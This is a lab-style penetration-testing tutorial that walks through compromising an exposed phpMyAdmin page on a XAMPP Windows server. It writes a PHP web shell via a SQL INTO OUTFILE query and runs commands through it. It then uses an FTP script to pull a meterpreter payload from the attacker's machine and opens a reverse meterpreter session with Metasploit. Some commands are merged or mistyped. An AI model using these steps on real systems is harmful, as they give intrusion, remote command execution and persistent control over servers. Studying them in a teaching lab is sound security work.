# Task 2: Exploiting an Open phpMyAdmin Page
Suppose we didn't know the WebDAV credentials. We could still exploit this server via phpMyAdmin. phpMyAdmin is another convenience incuded in XAMPP, which provides a GUI for MySQL server administration.

On your Kali machine, in IceWeasel, enter this URL, replacing the IP address with the IP address of your Windows 2008 Server target.

       	http://192.168.119.130/phpmyadmin
You see the phpMyAdmin page, with fields and buttons allowing you to manage MySQL databases

This page should not be exposed to the Internet

- In the phpMyAdmin page, at the top, click SQL.
- We can run SQL queries on the server with this page. Enter this query into the box, as shown below:
```
    	SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"
```

This SQL query will write a PHP file that executes the "cmd" command into a file named "shell.pmp" on the server.

This amounts to the same thing we were able to do with the default WebDAV credentials.
- In the phpMyAdmin page, at the bottom right, click Go.
The phpMyAdmin home page appears.
- Open a new IeWeasel tab and enter this URL, replacing the IP address with the IP address of your Windows 2008 Server target.
```
	http://192.168.119.130/shell.php
```
You see a 'Warning...Cannot execute a blank command" message, as shown below. (My URL contains "shell2.php" because I made a mistake with the first query. If you're careful, that won't happen to you.)

We can't just execute "cmd" -- we need to specify a command to execute.
- In IceWeasel, add "?cmd=ipconfig" to the end of the URL, like this:
	http://192.168.119.130/shell.php?cmd=ipconfig
You see the output of the IPCONFIG command, as shown below.


## Using FTP to Upload Malware
We'd like to upload a more powerful program, such as the "meterpreter.php" attack we created previously. We could host the file on our Kali box with Apache, but Windows doesn't include any command-line browser tool like wget or curl for us to use.

Real malware often uses FTP to upload files.

#### Starting an FTP Server on Kali
On Kali, in a Terminal window, execute these commands, which will install vsftpd, create a directory it requires, copy the meterpreter.php file to its default directory, and edit the configuration file:
```
	apt-get update apt-get install vsftpd -y
	mkdir /var/run/vsftpd
	mkdir /var/run/vsftpd/empty
	cp /tmp/meterpreter.php /srv/ftp nano /etc/vsftpd.conf
  ```
In nano, change
```
	anonymous_enable=NO
to
	anonymous_enable=YES
```

- Press Ctrl+X, Y, Enter to save the file.
- On Kali, in a Terminal window, execute this command:
```
vsftpd
```
Leave this window open.
Creating an FTP Script on the Target Windows Machine
On Kali, in IceWeasel, in the phpMyAdmin page, at the top, click SQL. Enter this query into the box, as shown below:
```
	SELECT "anonymous", "a@b.com", "lcd C:\xampp\htdocs", "get meterpreter.php" into outfile "C:\\xampp\\htdocs\\script" FIELDS TERMINATED BY '\n'
```

- In the phpMyAdmin page, at the bottom right, click Go.
The phpMyAdmin home page appears.
- Open a new IeWeasel tab and enter this URL, replacing the IP address with the IP address of your Windows 2008 Server target.
```
	http://192.168.119.130/script
```
You see a script containing four lines of FTP commands, as shown below. The first two lines are the username and password for an anonymous logi.
The lcd command changes the local working directory to the home directory for the Web server.
The last command downloads meterpreter.php.



#### Running the FTP Transfer
- Open a new IeWeasel tab and enter this URL, replacing the first IP address with the IP address of your Windows 2008 Server target and the second IP address with the IP address of your Kali machine.
	http://192.168.119.130/shell.php?cmd=ftp -s:script 192.168.119.131
You see the output of the FTP commands, ending with "Transfer complete", as shown below.


#### Starting a Metasploit Listener
- On your Kali machine, execute these commands, replacing the IP address with the address of your Kali machine:
```
	msfconsole use multi/handler
	set payload php/meterpreter_reverse_tcp
	set LHOST 192.168.119.131
	set LPORT 443 exploit
  ```
Metasploit is now waiting for connections


#### Launching the Meterpreter Shell
- Open a new IeWeasel tab and enter this URL, replacing the IP address with the IP address of your Windows 2008 Server target.
	http://192.168.119.130/meterpreter.php
The browser hangs, but the Metasploit listener should show a "Meterpreter session opened" message. as shown below.
